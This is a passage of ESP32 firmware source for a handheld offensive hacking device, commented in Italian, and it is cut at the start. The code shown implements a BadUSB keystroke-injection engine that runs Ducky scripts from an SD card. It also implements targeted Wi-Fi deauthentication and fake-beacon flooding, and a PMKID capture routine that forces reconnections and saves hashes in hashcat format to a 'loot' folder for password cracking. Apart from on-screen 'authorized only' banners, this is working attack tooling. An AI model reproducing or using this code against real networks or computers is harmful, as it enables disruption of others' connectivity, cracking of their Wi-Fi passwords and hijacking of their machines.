    case '%': pressCombo(SH, 0, '5'); return;
    case '&': pressCombo(SH, 0, '6'); return;
    case '/': pressCombo(SH, 0, '7'); return;
    case '(': pressCombo(SH, 0, '8'); return;
    case ')': pressCombo(SH, 0, '9'); return;
    case '=': pressCombo(SH, 0, '0'); return;
    case '?': pressCombo(SH, 0, '-'); return;
    case '\'':pressCombo(0,  0, '-'); return;
    case '^': pressCombo(SH, 0, '='); return;
    case '+': pressCombo(0,  0, ']'); return;
    case '*': pressCombo(SH, 0, ']'); return;
    case '@': pressCombo(0,  AG, ';'); return;
    case '#': pressCombo(0,  AG, '\''); return;
    case '[': pressCombo(0,  AG, '['); return;
    case ']': pressCombo(0,  AG, ']'); return;
    case '{': pressCombo(SH, AG, '['); return;
    case '}': pressCombo(SH, AG, ']'); return;
    case '-': pressCombo(0,  0, '/'); return;
    case '_': pressCombo(SH, 0, '/'); return;
    case ':': pressCombo(SH, 0, '.'); return;
    case ';': pressCombo(SH, 0, ','); return;
    case '\\':pressCombo(0,  0, '`'); return;
    case '|': pressCombo(SH, 0, '`'); return;
    case '~': pressCombo(0,  AG, '='); return;
    default:  Keyboard.write((uint8_t)c); return;  // lettere, cifre, spazio, . ,
  }
}
static void typeStr(const String &s) {
  if (!layoutIT) { Keyboard.print(s); return; }
  for (unsigned i = 0; i < s.length(); i++) typeITchar(s[i]);
}

static uint8_t duckyMod(const String &t) {
  if (t == "GUI" || t == "WINDOWS" || t == "WIN") return KEY_LEFT_GUI;
  if (t == "CTRL" || t == "CONTROL") return KEY_LEFT_CTRL;
  if (t == "ALT") return KEY_LEFT_ALT;
  if (t == "SHIFT") return KEY_LEFT_SHIFT;
  return 0;
}
static uint8_t duckyKey(const String &t) {
  if (t == "ENTER" || t == "RETURN") return KEY_RETURN;
  if (t == "TAB") return KEY_TAB;
  if (t == "ESC" || t == "ESCAPE") return KEY_ESC;
  if (t == "SPACE") return ' ';
  if (t == "DELETE" || t == "DEL") return KEY_DELETE;
  if (t == "BACKSPACE") return KEY_BACKSPACE;
  if (t == "UP" || t == "UPARROW") return KEY_UP_ARROW;
  if (t == "DOWN" || t == "DOWNARROW") return KEY_DOWN_ARROW;
  if (t == "LEFT" || t == "LEFTARROW") return KEY_LEFT_ARROW;
  if (t == "RIGHT" || t == "RIGHTARROW") return KEY_RIGHT_ARROW;
  if (t == "HOME") return KEY_HOME;
  if (t == "END") return KEY_END;
  if (t.length() == 1) return (uint8_t)t[0];
  return 0;
}
static void duckyLine(String line) {
  line.trim();
  if (line.length() == 0 || line.startsWith("REM")) return;
  if (line.startsWith("DELAY")) { delay(line.substring(5).toInt()); return; }
  if (line.startsWith("STRING ")) { typeStr(line.substring(7)); return; }
  // combo: modificatori + tasto finale
  uint8_t mods[4]; int nm = 0; uint8_t key = 0;
  String rest = line;
  while (true) {
    int sp = rest.indexOf(' ');
    String tok = (sp < 0) ? rest : rest.substring(0, sp);
    uint8_t m = duckyMod(tok);
    if (m && nm < 4) mods[nm++] = m; else key = duckyKey(tok);
    if (sp < 0) break;
    rest = rest.substring(sp + 1);
  }
  for (int i = 0; i < nm; i++) Keyboard.press(mods[i]);
  if (key) Keyboard.press(key);
  delay(25);
  Keyboard.releaseAll();
}
static void runDuckyFile(const char *path) {
  File f = SD.open(path);
  if (!f) return;
  String line;
  while (f.available()) {
    char c = f.read();
    if (c == '\n') { duckyLine(line); line = ""; }
    else if (c != '\r') line += c;
  }
  if (line.length()) duckyLine(line);
  f.close();
}
static void runDuckyBuiltin() {
  Keyboard.print("NexusSec ESP32 - BadUSB HID demo (solo test autorizzati)");
  Keyboard.write(KEY_RETURN);
}
static void badusbScan() {
  plN = 0;
  if (sdInit()) {
    File d = SD.open("/payloads");
    if (d && d.isDirectory()) {
      File f = d.openNextFile();
      while (f && plN < 20) {
        if (!f.isDirectory()) plList[plN++] = String("/payloads/") + f.name();
        f = d.openNextFile();
      }
    }
  }
}
void moduleBadusb() {
  tft.fillScreen(C_BG);
  statusBar("BADUSB / HID");
  badusbScan();

  tft.setTextDatum(ML_DATUM);
  tft.setTextFont(1);
  tft.setTextColor(C_CRIT, C_BG);
  tft.drawString("! Esegue keystroke sul PC collegato", 6, SBAR + 10);
  tft.setTextColor(C_MUT, C_BG);
  tft.drawString("Payload /payloads (SD) - layout US", 6, SBAR + 24);

  int y = SBAR + 40, rowH = 20, maxRows = (H - FBAR - y) / rowH;
  if (plN == 0) {
    tft.setTextFont(2);
    tft.setTextColor(C_CY, C_BG);
    tft.drawString("> demo integrata (HID)", 8, y + rowH / 2);
  } else {
    if (badusbSel >= plN) badusbSel = 0;
    for (int i = 0; i < plN && i < maxRows; i++) {
      String nm = plList[i];
      int s = nm.lastIndexOf('/');
      if (s >= 0) nm = nm.substring(s + 1);
      if (nm.length() > 20) nm = nm.substring(0, 19) + "~";
      tft.setTextFont(2);
      bool sel = (i == badusbSel);
      tft.setTextColor(sel ? C_CY : C_TXT, C_BG);
      tft.drawString((sel ? "> " : "  ") + nm, 8, y + rowH / 2);
      y += rowH;
    }
  }
  footerBar("OK esegui  NEXT scegli  PREV menu");
}
void badusbRun() {
  tft.fillScreen(C_BG);
  statusBar("BADUSB / HID");
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(4);
  tft.setTextColor(C_WARN, C_BG);
  tft.drawString("Esecuzione...", W / 2, H / 2);
  delay(400);
  if (plN == 0) runDuckyBuiltin();
  else runDuckyFile(plList[badusbSel % plN].c_str());
  tft.setTextColor(C_OK, C_BG);
  tft.drawString("Fatto", W / 2, H / 2 + 30);
  footerBar("OK di nuovo  NEXT scegli  PREV menu");
}

// ============================================================================
// Modulo REALE: Attacco WiFi (deauth mirato + beacon spam) — SOLO AUTORIZZATO
//   Iniezione 802.11 raw via esp_wifi_80211_tx. Efficacia da validare su HW.
// ============================================================================
struct ApT { uint8_t bssid[6]; uint8_t ch; char ssid[24]; };
static ApT apCache[24];
static int apCacheN = 0;
static int atkSel = 0;

static void scanApCache() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  int n = WiFi.scanNetworks(false, true);
  apCacheN = 0;
  for (int i = 0; i < n && apCacheN < 24; i++) {
    memcpy(apCache[apCacheN].bssid, WiFi.BSSID(i), 6);
    apCache[apCacheN].ch = WiFi.channel(i);
    String s = WiFi.SSID(i);
    if (s.length() == 0) s = "<nascosta>";
    s.toCharArray(apCache[apCacheN].ssid, 24);
    apCacheN++;
  }
  WiFi.scanDelete();
}

static const uint8_t DEAUTH_TMPL[26] = {
  0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x00, 0x00, 0x07, 0x00
};
static uint32_t deauthBurst(const uint8_t *bssid, uint8_t ch) {
  uint8_t f[26];
  memcpy(f, DEAUTH_TMPL, 26);
  memcpy(f + 10, bssid, 6);   // src = AP
  memcpy(f + 16, bssid, 6);   // bssid = AP
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint32_t cnt = 0;
  uint32_t t0 = millis();
  while (millis() - t0 < 4000) {
    f[0] = 0xc0; esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false);  // deauth
    f[0] = 0xa0; esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false);  // disassoc
    cnt += 2;
    delay(1);
  }
  return cnt;
}

static uint32_t beaconSpam() {
  static const char *names[] = { "NexusSec_Test", "Free_WiFi", "Pentest_Lab", "Lab_2G", "GuestNet" };
  uint8_t pkt[128];
  const uint8_t head[] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
  const uint8_t rates[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c };
  uint32_t cnt = 0;
  uint32_t t0 = millis();
  while (millis() - t0 < 4000) {
    for (int k = 0; k < 5; k++) {
      int p = 0;
      memcpy(pkt, head, 10); p = 10;
      uint8_t mac[6] = { 0x02, 0x11, 0x22, (uint8_t)k, (uint8_t)random(255), (uint8_t)random(255) };
      memcpy(pkt + p, mac, 6); p += 6;   // src
      memcpy(pkt + p, mac, 6); p += 6;   // bssid
      pkt[p++] = 0x00; pkt[p++] = 0x00;  // seq
      for (int i = 0; i < 8; i++) pkt[p++] = 0;             // timestamp
      pkt[p++] = 0x64; pkt[p++] = 0x00;                     // interval
      pkt[p++] = 0x01; pkt[p++] = 0x04;                     // capability
      const char *nm = names[k];
      int nl = strlen(nm);
      pkt[p++] = 0x00; pkt[p++] = nl;                       // SSID IE
      memcpy(pkt + p, nm, nl); p += nl;
      memcpy(pkt + p, rates, sizeof(rates)); p += sizeof(rates);
      pkt[p++] = 0x03; pkt[p++] = 0x01; pkt[p++] = 1;       // DS param (ch 1)
      esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
      esp_wifi_80211_tx(WIFI_IF_STA, pkt, p, false);
      cnt++;
    }
    delay(2);
  }
  return cnt;
}

void moduleWifiAttack() {
  tft.fillScreen(C_BG);
  statusBar("ATTACCO WIFI");
  if (apCacheN == 0) {
    tft.setTextDatum(MC_DATUM); tft.setTextFont(2); tft.setTextColor(C_CY, C_BG);
    tft.drawString("Scansione target...", W / 2, H / 2);
    scanApCache();
    tft.fillScreen(C_BG); statusBar("ATTACCO WIFI");
  }
  tft.setTextDatum(ML_DATUM); tft.setTextFont(1);
  tft.setTextColor(C_CRIT, C_BG);
  tft.drawString("! MODALITA' OFFENSIVA - solo autorizzato", 6, SBAR + 10);

  int y = SBAR + 26, rowH = 18, maxRows = (H - FBAR - y) / rowH;
  int total = apCacheN + 1;                    // indice 0 = beacon spam
  if (atkSel >= total) atkSel = 0;
  int start = 0;
  if (atkSel >= maxRows) start = atkSel - maxRows + 1;
  for (int i = start; i < total && (i - start) < maxRows; i++) {
    bool sel = (i == atkSel);
    tft.setTextFont(2);
    tft.setTextColor(sel ? C_CY : C_TXT, C_BG);
    String label;
    if (i == 0) label = "\xBB Beacon spam (reti fake)";
    else { char b[40]; snprintf(b, sizeof(b), "c%d %s", apCache[i - 1].ch, apCache[i - 1].ssid); label = b; }
    if (label.length() > 26) label = label.substring(0, 25) + "~";
    tft.drawString((sel ? "> " : "  ") + label, 6, y + rowH / 2);
    y += rowH;
  }
  footerBar("OK esegui  NEXT scegli  PREV menu");
}

void wifiAttackRun() {
  tft.fillScreen(C_BG);
  statusBar("ATTACCO WIFI");
  tft.setTextDatum(MC_DATUM); tft.setTextFont(4);
  tft.setTextColor(C_CRIT, C_BG);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  uint32_t n;
  if (atkSel == 0) {
    tft.drawString("Beacon spam...", W / 2, H / 2);
    n = beaconSpam();
    tft.setTextColor(C_OK, C_BG); tft.setTextFont(2);
    char b[28]; snprintf(b, sizeof(b), "%lu beacon inviati", (unsigned long)n);
    tft.drawString(b, W / 2, H / 2 + 30);
  } else {
    ApT &t = apCache[atkSel - 1];
    tft.drawString("Deauth...", W / 2, H / 2 - 10);
    tft.setTextFont(2); tft.setTextColor(C_MUT, C_BG);
    tft.drawString(t.ssid, W / 2, H / 2 + 16);
    n = deauthBurst(t.bssid, t.ch);
    tft.setTextColor(C_OK, C_BG);
    char b[28]; snprintf(b, sizeof(b), "%lu frame inviati", (unsigned long)n);
    tft.drawString(b, W / 2, H / 2 + 40);
  }
  footerBar("OK di nuovo  NEXT scegli  PREV menu");
}

// ============================================================================
// Modulo REALE: Handshake / PMKID (sniffer promiscuo EAPOL + deauth) — AUTORIZZATO
//   Estrae il PMKID dal messaggio M1 e lo salva in formato hashcat 22000.
//   Implementazione beta: da validare su hardware.
// ============================================================================
static volatile int hsEapol = 0;
static volatile bool hsPmkid = false;
static char hsLine[160];
static uint8_t hsBssid[6];
static char hsSsid[24];
static int hsSel = 0;

static void hsCb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA) return;
  wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *d = p->payload;
  int len = p->rx_ctrl.sig_len;
  if (len < 40) return;
  uint8_t fc0 = d[0];
  if (((fc0 >> 2) & 3) != 2) return;            // solo frame DATA
  int hdr = 24;
  if ((fc0 >> 4) & 0x08) hdr += 2;              // QoS
  if (len < hdr + 8 + 4) return;
  if (!(d[hdr + 6] == 0x88 && d[hdr + 7] == 0x8e)) return;  // EAPOL
  uint8_t *eap = d + hdr + 8;
  if (eap[1] != 0x03) return;                   // EAPOL-Key
  hsEapol++;
  uint8_t *a1 = d + 4, *a2 = d + 10, *a3 = d + 16;
  if (memcmp(a3, (const void *)hsBssid, 6) != 0) return;
  int avail = len - (hdr + 8);
  for (int i = 0; i + 20 <= avail; i++) {
    if (eap[i] == 0x00 && eap[i + 1] == 0x0f && eap[i + 2] == 0xac && eap[i + 3] == 0x04) {
      if (hsPmkid) return;
      uint8_t *pk = eap + i + 4;                 // 16 byte PMKID (M1: src=AP)
      char *o = hsLine;
      o += sprintf(o, "WPA*01*");
      for (int b = 0; b < 16; b++) o += sprintf(o, "%02x", pk[b]);
      o += sprintf(o, "*");
      for (int b = 0; b < 6; b++) o += sprintf(o, "%02x", a2[b]);   // AP
      o += sprintf(o, "*");
      for (int b = 0; b < 6; b++) o += sprintf(o, "%02x", a1[b]);   // STA
      o += sprintf(o, "*");
      for (unsigned b = 0; b < strlen((const char *)hsSsid); b++) o += sprintf(o, "%02x", (uint8_t)hsSsid[b]);
      o += sprintf(o, "***");
      hsPmkid = true;
      return;
    }
  }
}

void moduleHandshake() {
  tft.fillScreen(C_BG);
  statusBar("HANDSHAKE / PMKID");
  if (apCacheN == 0) {
    tft.setTextDatum(MC_DATUM); tft.setTextFont(2); tft.setTextColor(C_CY, C_BG);
    tft.drawString("Scansione target...", W / 2, H / 2);
    scanApCache();
    tft.fillScreen(C_BG); statusBar("HANDSHAKE / PMKID");
  }
  tft.setTextDatum(ML_DATUM); tft.setTextFont(1); tft.setTextColor(C_MUT, C_BG);
  tft.drawString("Scegli l'AP target", 6, SBAR + 10);
  int y = SBAR + 26, rowH = 18, maxRows = (H - FBAR - y) / rowH;
  if (hsSel >= apCacheN) hsSel = 0;
  int start = (hsSel >= maxRows) ? hsSel - maxRows + 1 : 0;
  for (int i = start; i < apCacheN && (i - start) < maxRows; i++) {
    bool sel = (i == hsSel);
    tft.setTextFont(2); tft.setTextColor(sel ? C_CY : C_TXT, C_BG);
    char b[40]; snprintf(b, sizeof(b), "c%d %s", apCache[i].ch, apCache[i].ssid);
    String label = b; if (label.length() > 26) label = label.substring(0, 25) + "~";
    tft.drawString((sel ? "> " : "  ") + label, 6, y + rowH / 2);
    y += rowH;
  }
  footerBar("OK cattura  NEXT scegli  PREV menu");
}

void handshakeRun() {
  ApT &t = apCache[hsSel];
  memcpy((void *)hsBssid, t.bssid, 6);
  strncpy(hsSsid, t.ssid, sizeof(hsSsid));
  hsEapol = 0; hsPmkid = false;

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_channel(t.ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&hsCb);

  uint8_t f[26];
  memcpy(f, DEAUTH_TMPL, 26);
  memcpy(f + 10, t.bssid, 6);
  memcpy(f + 16, t.bssid, 6);

  uint32_t t0 = millis(), lastD = 0;
  while (millis() - t0 < 15000 && !hsPmkid) {
    if (millis() - lastD > 2000) {              // deauth periodico per forzare M1
      lastD = millis();
      for (int i = 0; i < 16; i++) { esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false); delay(1); }
    }
    tft.fillRect(0, SBAR, W, H - SBAR - FBAR, C_BG);
    statusBar("HANDSHAKE / PMKID");
    tft.setTextDatum(MC_DATUM); tft.setTextFont(2); tft.setTextColor(C_MUT, C_BG);
    tft.drawString(t.ssid, W / 2, SBAR + 24);
    tft.setTextFont(4); tft.setTextColor(C_CY, C_BG);
    char b[16]; snprintf(b, sizeof(b), "%d", hsEapol);
    tft.drawString(b, W / 2, SBAR + 64);
    tft.setTextFont(2); tft.setTextColor(C_MUT, C_BG);
    tft.drawString("frame EAPOL", W / 2, SBAR + 92);
    tft.setTextColor(hsPmkid ? C_OK : C_WARN, C_BG);
    tft.drawString(hsPmkid ? "PMKID acquisito!" : "in ascolto...", W / 2, SBAR + 122);
    delay(250);
  }

  esp_wifi_set_promiscuous(false);

  bool saved = false;
  if (hsPmkid && sdInit()) {
    SD.mkdir("/loot");
    File f2 = SD.open("/loot/pmkid.22000", FILE_APPEND);
    if (f2) { f2.println(hsLine); f2.close(); saved = true; }
  }

  tft.fillScreen(C_BG);
  statusBar("HANDSHAKE / PMKID");
  tft.setTextDatum(MC_DATUM); tft.setTextFont(4);
  tft.setTextColor(hsPmkid ? C_OK : C_MUT, C_BG);
  tft.drawString(hsPmkid ? "PMKID!" : "Nessun PMKID", W / 2, H / 2 - 10);
  tft.setTextFont(1); tft.setTextColor(C_MUT, C_BG);
  tft.drawString(saved ? "salvato: /loot/pmkid.22000" :
                 (hsPmkid ? "microSD assente: non salvato" : "riprova avvicinandoti all'AP"),
                 W / 2, H / 2 + 24);
  footerBar("OK di nuovo  NEXT scegli  PREV menu");
}

// Schermata segnaposto per i moduli non ancora implementati
void modulePlaceholder(int id) {
  tft.fillScreen(C_BG);
  statusBar(PROF_NAME[id]);
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(4);
  tft.setTextColor(C_CY, C_BG);
  tft.drawString(PROF_NAME[id], W / 2, H / 2 - 20);
  tft.setTextFont(2);
  tft.setTextColor(C_MUT, C_BG);
  tft.drawString("modulo in sviluppo", W / 2, H / 2 + 8);
  footerBar("PREV menu");
}

// Impostazioni: commuta orientamento (persistito in NVS)
void applyRotation();
void moduleSettings() {
  tft.fillScreen(C_BG);
  statusBar("IMPOSTAZIONI");
  tft.setTextDatum(ML_DATUM);
  tft.setTextFont(2);
  tft.setTextColor(C_TXT, C_BG);
  tft.drawString("Orientamento:", 10, SBAR + 24);
  tft.setTextColor(C_CY, C_BG);
  tft.drawString(rotation == 0 ? "Verticale" : "Orizzontale", 10, SBAR + 48);
  tft.setTextFont(2); tft.setTextColor(C_TXT, C_BG);
  tft.drawString("Layout BadUSB:", 10, SBAR + 78);
  tft.setTextColor(C_CY, C_BG);
  tft.drawString(layoutIT ? "IT" : "US", 10, SBAR + 100);
  tft.setTextColor(C_MUT, C_BG); tft.setTextFont(1);
  tft.drawString("firmware v" NXS_FW_VERSION, 10, SBAR + 128);
  footerBar("OK orientamento  NEXT layout  PREV menu");
}

void openModule(int id) {
  curProfile = id;
  state = ST_MODULE;
  if (id == P_RECON)       { wardrivingMode = false; moduleWifiScan(); }
  else if (id == P_ATTACK)   { atkSel = 0; apCacheN = 0; moduleWifiAttack(); }
  else if (id == P_HANDSHAKE) { hsSel = 0; apCacheN = 0; moduleHandshake(); }
  else if (id == P_BLE)      moduleBleScan();
  else if (id == P_NRF24)    moduleNrf24Scan();
  else if (id == P_SUBGHZ)   moduleSubghz();
  else if (id == P_IR)       moduleIrCapture();
  else if (id == P_BADUSB)   { badusbSel = 0; moduleBadusb(); }
  else if (id == P_LOOT)     moduleLoot();
  else if (id == P_SETTINGS) moduleSettings();
  else                       modulePlaceholder(id);
}

void applyRotation() {
  tft.setRotation(rotation);
  W = tft.width();
  H = tft.height();
}

// ============================================================================
// setup / loop
// ============================================================================
void setup() {
  Serial.begin(115200);
#if NXS_TARGET_SIM
  pinMode(BTN_PREV, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_NEXT, INPUT_PULLUP);
#else
  pcfBegin();
#endif

  Keyboard.begin();   // BadUSB/HID (effettivo solo su hardware reale)
  USB.begin();

  prefs.begin("nxs", false);
  rotation = prefs.getUChar("rot", 0);
  layoutIT = prefs.getUChar("kbdit", 0);

  tft.init();
  applyRotation();
  tft.fillScreen(C_BG);

  state = ST_LEGAL;
  drawLegal();
}

void loop() {
  bool p, o, n;
  readNav(p, o, n);
  if (!p && !o && !n) { delay(8); return; }

  switch (state) {
    case ST_LEGAL:
      if (o) { state = ST_HOME; drawHome(); }
      break;

    case ST_HOME:
      if (n) { homeSel = (homeSel + 1) % P_COUNT; drawHome(); }
      if (p) { homeSel = (homeSel + P_COUNT - 1) % P_COUNT; drawHome(); }
      if (o) { openModule(homeSel); }
      break;

    case ST_MODULE:
      if (p) { state = ST_HOME; drawHome(); }        // indietro
      else if (n && curProfile == P_RECON) { wardrivingMode = true; moduleWardriving(); }
      else if (n && curProfile == P_BADUSB) { badusbSel++; moduleBadusb(); }
      else if (n && curProfile == P_ATTACK) { atkSel++; moduleWifiAttack(); }
      else if (n && curProfile == P_HANDSHAKE) { hsSel++; moduleHandshake(); }
      else if (n && curProfile == P_SETTINGS) { layoutIT = !layoutIT; prefs.putUChar("kbdit", layoutIT ? 1 : 0); moduleSettings(); }
      else if (o) {                                   // azione del modulo
        if (curProfile == P_RECON) { if (wardrivingMode) moduleWardriving(); else moduleWifiScan(); }
        else if (curProfile == P_ATTACK) wifiAttackRun();
        else if (curProfile == P_HANDSHAKE) handshakeRun();
        else if (curProfile == P_BLE) moduleBleScan();
        else if (curProfile == P_NRF24) moduleNrf24Scan();
        else if (curProfile == P_SUBGHZ) moduleSubghz();
        else if (curProfile == P_IR) moduleIrCapture();
        else if (curProfile == P_BADUSB) badusbRun();
        else if (curProfile == P_LOOT) moduleLoot();
        else if (curProfile == P_SETTINGS) {
          rotation = rotation ? 0 : 1;
          prefs.putUChar("rot", rotation);
          applyRotation();
          moduleSettings();
        }
      }
      break;
  }
}
